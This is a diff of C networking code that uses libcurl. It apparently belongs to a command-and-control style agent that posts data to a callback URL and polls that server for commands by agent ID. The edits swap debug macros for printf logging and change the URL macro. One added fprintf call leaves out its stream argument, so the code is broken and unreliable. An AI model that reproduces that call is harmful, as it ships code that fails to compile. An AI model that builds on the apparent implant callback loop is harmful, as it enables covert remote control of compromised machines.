@@ -10,19 +10,24 @@
 // =======================
 int post_data(const char* json_data, char *agent_id)
 {
+    DEBUG_LOG("Posting Data...");
     CURL *curl;
     CURLcode res;
     int ret = 0;
 
     curl = curl_easy_init();
     if (!curl) {
-        //DEBUG_LOGF(stderr, "curl_easy_init failed\n");
+        printf("curl_easy_init failed\n");
         return 1;
     }
 
     // Construct URL using your callback macro (only the relative path)
     char url[150];
-    snprintf(url, sizeof(url), CALLBACK_HTTP_FORMAT_POST_ENDPOINT, agent_id);
+    //: curl_easy_perform() failed: URL using bad/illegal format or missing URL
+    //switched macro to CALLBACK_HTTP_FULL_POST_URL from CALLBACK_HTTP_FORMAT_POST_ENDPOINT
+    snprintf(url, sizeof(url), CALLBACK_HTTP_FULL_POST_URL, agent_id);
+    DEBUG_LOG("Constructed URL: %s\n", url);
+
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_POST, 1L);
@@ -35,10 +40,10 @@ int post_data(const char* json_data, char *agent_id)
 
     res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
-        //DEBUG_LOGF(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
         ret = 1;
     } else {
-        //DEBUG_LOG("POST request sent successfully.\n");
+        printf("POST request sent successfully.\n");
     }
 
     curl_slist_free_all(headers);
@@ -103,10 +108,11 @@ InboundJsonDataStruct get_command_data(char *agent_id)
 
     res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
-        //DEBUG_LOGF(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        fprintf(stdout, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
     } else {
-        //DEBUG_LOG("Received JSON\n");
+        fprintf("Raw JSON Response: %s\n", chunk.response);
         result = decode_command_json(chunk.response);
+
     }
 
     curl_easy_cleanup(curl);
